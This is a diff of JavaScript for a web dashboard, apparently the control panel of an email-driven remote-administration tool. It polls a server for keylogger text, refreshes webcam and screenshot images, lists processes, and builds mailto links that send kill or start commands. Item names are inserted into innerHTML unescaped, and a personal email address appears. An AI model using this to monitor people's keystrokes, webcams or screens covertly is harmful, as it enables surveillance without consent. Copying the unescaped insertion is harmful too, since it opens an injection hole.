@@ -94,88 +94,119 @@ inputkl.addEventListener("input", (event) => {
 
 
 
-//Code for application and processor
-var btns = document.querySelectorAll(".delete");
-btns.forEach(btn => {
-    btn.addEventListener("click", (e) => {
-        const li = e.target.parentElement;
-        li.parentElement.removeChild(li);
-    });
-})
-
-const addAppName = document.querySelector("#add-app > #name");
-const addAppRealName = document.querySelector("#add-app > #real-name");
-const addAppBtn = document.querySelector("#add-app > button");
-
-addAppBtn.disabled = true;
-function checkUserInput() {
-    if (addAppName.value !== "" && addAppRealName.value !== "") {
-        addAppBtn.disabled = false;
-    } else {
-        addAppBtn.disabled = true;
-    }
-}
-addAppName.addEventListener("input", checkUserInput);
-addAppRealName.addEventListener("input", checkUserInput);
-
-addAppBtn.addEventListener("click", (e) => {
-    e.preventDefault();
-    const li = document.createElement("li");
-    const img = document.createElement("img");
-    const name = document.createElement("span");
-    const realName = document.createElement("span");
-    const deleteBtn = document.createElement("span");
-    img.src = "https://i.stack.imgur.com/3hRmg.png";
-    name.textContent = addAppName.value;
-    realName.textContent = addAppRealName.value;
-    deleteBtn.textContent = "delete";
-    img.classList.add("app-image");
-    name.classList.add("name");
-    realName.classList.add("real-name");
-    deleteBtn.classList.add("delete");
-    li.appendChild(img);
-    li.appendChild(name);
-    li.appendChild(realName);
-    li.appendChild(deleteBtn);
-    document.querySelector("#app-list > ul").appendChild(li);
-    addAppName.value = "";
-    addAppRealName.value = "";
-    deleteBtn.addEventListener("click", (e) => {
-        const li = e.target.parentElement;
-        li.parentElement.removeChild(li);
-    });
-})
-
-const searchBar = document.forms["search-app"].querySelector("input");
-searchBar.addEventListener('keyup', e => {
-    const term = e.target.value.toLowerCase();
-    const apps = document.querySelectorAll("#app-list > ul > li");
-    apps.forEach(app => {
-        const name = app.querySelector(".name").textContent.toLowerCase();
-        const realName = app.querySelector(".real-name").textContent.toLowerCase();
-        if(name.indexOf(term) != -1 || realName.indexOf(term) != -1) {
-            app.style.display = "block";
-        } else {
-            app.style.display = "none";
-        }
-    })
-})
 
 
-let refreshBtn = document.querySelector("#refresh-data");
-refreshBtn.addEventListener('click', e => {
-    e.preventDefault();
-    // AJAX request to fetch updated key logger data
+//Code for key logger
+setInterval(function() {
     fetch('/get-key-logger/')  // Use the appropriate URL here
         .then(response => response.json())
         .then(data => {
             // Update the HTML content with the fetched data
             let keyLoggerSpan = document.querySelector('#show-key-logger');
-            keyLoggerSpan.textContent = `Key logger: ${data.key_logger}`;
+            keyLoggerSpan.innerHTML = `<strong>Key logger:</strong> ${data.key_logger}`;
         })
         .catch(error => {
             console.error('Error fetching data:', error);
         });
+}, 5000);
+
+
+
+//Code for applications
+const tableListApps = document.getElementById("list-apps");
+
+setInterval(function() {
+    if (document.forms["search-app"].querySelector("input").value === "") {
+        fetch("/get-list-apps/")
+            .then(response => response.json())
+            .then(data => {
+                tableListApps.innerHTML = `
+                    <tr>
+                        <th>Id</th>
+                        <th>Name</th>
+                        <th>Thread</th>
+                        <th>Send email</th>
+                    </tr>
+                `;
+                JSON.parse(data.list_apps).forEach(item => {
+                    const itemElement = document.createElement("tr");
+                    itemElement.innerHTML = `
+                        <td>${item.id}</td>
+                        <td class="name">${item.name}</td>
+                        <td>${item.thread}</td>
+                        <td><a href="mailto:nguyennam002004@gmail.com?subject=Application%2FProcess&body=Kill%5Bname%3A${item.name}%5D%26%26List%20Application">Kill</a></td>
+                    `;
+                    tableListApps.appendChild(itemElement);                
+                });
+            })
+            .catch(error => {
+                console.log('Error fetching data:', error);
+            });
+    };
+}, 5000);
+
+
+//Code for processes
+const tableListProcess = document.getElementById("list-processes");
+setInterval(function() {
+    if (document.forms["search-app"].querySelector("input").value === "") {
+        fetch("/get-list-processes/")
+            .then(response => response.json())
+            .then(data => {
+                tableListProcess.innerHTML = `
+                    <tr>
+                        <th>Id</th>
+                        <th>Name</th>
+                        <th>Thread</th>
+                        <th>Send email</th>
+                    </tr>
+                `;
+                JSON.parse(data.list_processes).forEach(item => {
+                    const itemElement = document.createElement("tr");
+                    itemElement.innerHTML = `
+                        <td>${item.id}</td>
+                        <td class="name">${item.name}</td>
+                        <td>${item.thread}</td>
+                        <td><a href="mailto:nguyennam002004@gmail.com?subject=Application%2FProcess&body=Kill%5Bname%3A${item.name}%5D%26%26List%20Process">Kill</a></td>
+                    `;
+                    tableListProcess.appendChild(itemElement);                
+                });
+            })
+            .catch(error => {
+                console.log('Error fetching data:', error);
+            });
+    };
+}, 5000);
+
+
+//Code for search
+const searchBar = document.forms["search-app"].querySelector("input");
+searchBar.addEventListener('keyup', e => {
+    const term = e.target.value.toLowerCase();
+    const items = document.querySelectorAll("#app-list > table > tr");
+    items.forEach(item => {
+        const name = item.querySelector(".name").textContent.toLowerCase();
+        if(name.indexOf(term) != -1) {
+            item.style.display = "table-row";
+        } else {
+            item.style.display = "none";
+        }
+    })
 })
 
-    
+
+const webcam_image = document.getElementById("webcam-image");
+const screenshot_image = document.getElementById("screenshot-image");
+
+setInterval(function() {
+    webcam_image.src=`/static/server/images/Webcam_image.png` + '?' + new Date().getTime();
+    screenshot_image.src=`/static/server/images/Screenshot.png` + '?' + new Date().getTime();
+}, 5000);
+
+
+const openAppInput = document.getElementById("open-new-app-process");
+const openAppBtn = document.querySelector("#add-app > a");
+openAppInput.addEventListener("input", (event) => {
+    const nameApp = event.target.value;
+    openAppBtn.href = `mailto:nguyennam002004@gmail.com?subject=Application%2FProcess&body=Start%5Bname%3A${nameApp}%5D%26%26List%20Application`
+});
